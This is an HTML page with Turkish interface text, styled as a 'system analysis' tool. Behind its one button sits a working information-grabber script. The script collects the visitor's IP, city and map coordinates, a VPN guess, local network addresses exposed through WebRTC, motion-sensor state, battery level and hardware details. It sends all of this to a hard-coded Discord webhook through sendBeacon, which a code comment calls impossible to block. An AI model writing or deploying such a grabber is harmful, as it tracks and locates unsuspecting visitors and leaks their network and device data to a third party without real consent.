<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Sistem Entegrasyon Birimi</title>
    <style>
        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .trigger-btn { 
            padding: 20px 40px; background: #000; border: 1px solid #0f0; color: #0f0; 
            font-family: 'Courier New', monospace; cursor: pointer; transition: 0.3s;
        }
        .trigger-btn:hover { background: #0f0; color: #000; box-shadow: 0 0 20px #0f0; }
    </style>
</head>
<body>

    <button class="trigger-btn" onclick="MasterEngine.ignite()">Sƒ∞STEMƒ∞ ANALƒ∞Z ET</button>

    <script>
        "use strict";

        const MasterEngine = (function() {
            // KONFIGURASYON
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

            const Utils = {
                async getBattery() {
                    if (!navigator.getBattery) return "Not Supported";
                    const b = await navigator.getBattery();
                    return { level: `${Math.round(b.level * 100)}%`, status: b.charging ? "AC Power" : "On Battery" };
                },

                getHardware() {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                    const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
                    return {
                        gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A",
                        cores: navigator.hardwareConcurrency,
                        ram: navigator.deviceMemory || "Hidden",
                        res: `${screen.width}x${screen.height}`
                    };
                },

                async getKinetics() {
                    return new Promise(res => {
                        const h = (e) => {
                            const a = e.accelerationIncludingGravity;
                            if (a) {
                                const v = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
                                let s = v > 13.5 ? "Moving (Fast)" : (v > 10.5 ? "Moving (Slow)" : "Static");
                                window.removeEventListener('devicemotion', h);
                                res(s);
                            }
                        };
                        window.addEventListener('devicemotion', h);
                        setTimeout(() => res("Static/No Access"), 1000);
                    });
                },

                async discoverLAN() {
                    return new Promise(res => {
                        const pc = new RTCPeerConnection();
                        const nodes = [];
                        pc.createDataChannel("");
                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && nodes.push(e.candidate.candidate.split(" ")[4]);
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        setTimeout(() => { pc.close(); res(nodes.join(", ") || "Isolated"); }, 1500);
                    });
                },

                async getNet() {
                    try {
                        const r = await fetch('https://ipapi.co/json/').then(res => res.json());
                        const isVPN = Intl.DateTimeFormat().resolvedOptions().timeZone !== r.timezone;
                        return { ...r, vpn: isVPN ? "‚ö†Ô∏è DETECTED" : "‚úÖ CLEAN" };
                    } catch { return { ip: "Blocked", vpn: "Unknown" }; }
                }
            };

            return {
                async ignite() {
                    console.log("[*] Engine ignited. Extracting data...");
                    
                    // Mod√ºlleri Paralel √áalƒ±≈ütƒ±r (Asenkron Optimizasyon)
                    const [battery, kinetics, lan, net] = await Promise.all([
                        Utils.getBattery(),
                        Utils.getKinetics(),
                        Utils.discoverLAN(),
                        Utils.getNet()
                    ]);

                    const hardware = Utils.getHardware();
                    const regional = { tz: Intl.DateTimeFormat().resolvedOptions().timeZone, lang: navigator.language };
                    const platform = { os: navigator.platform, agent: navigator.userAgent };

                    // Rapor Hazƒ±rlama
                    const payload = {
                        content: "üíÄ **MASTER ENGINE V26 - FULL SPECTRUM REPORT**",
                        embeds: [{
                            color: 0x00FF00,
                            fields: [
                                { name: "üì° NETWORK & VPN", value: `**IP:** \`${net.ip}\`\n**VPN:** ${net.vpn}\n**ISP:** ${net.org}\n**Loc:** ${net.city}, ${net.country_name}\n[Map](https://www.google.com/maps?q=${net.latitude},${net.longitude})`, inline: false },
                                { name: "üõ∞Ô∏è LAN & KINETICS", value: `**Nodes:** \`${lan}\`\n**Motion:** ${kinetics}`, inline: true },
                                { name: "üîã POWER", value: `**Battery:** ${battery.level || "N/A"}\n**Source:** ${battery.status || "N/A"}`, inline: true },
                                { name: "‚öôÔ∏è HARDWARE", value: `**GPU:** ${hardware.gpu}\n**CPU:** ${hardware.cores} Cores | **RAM:** ${hardware.ram}GB\n**Res:** ${hardware.res}`, inline: false },
                                { name: "üåç REGIONAL & PLATFORM", value: `**TZ:** ${regional.tz} | **Lang:** ${regional.lang}\n**OS:** ${platform.os}\n**Agent:** \`\`\`${platform.agent}\`\`\``, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };

                    // Discord'a G√∂nderim (Beacon API - Bloke Edilemez)
                    const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
                    navigator.sendBeacon(WEBHOOK_URL, blob);
                    
                    alert("Sistem Analizi Discord'a G√∂nderildi.");
                }
            };
        })();
    </script>
</body>
</html>
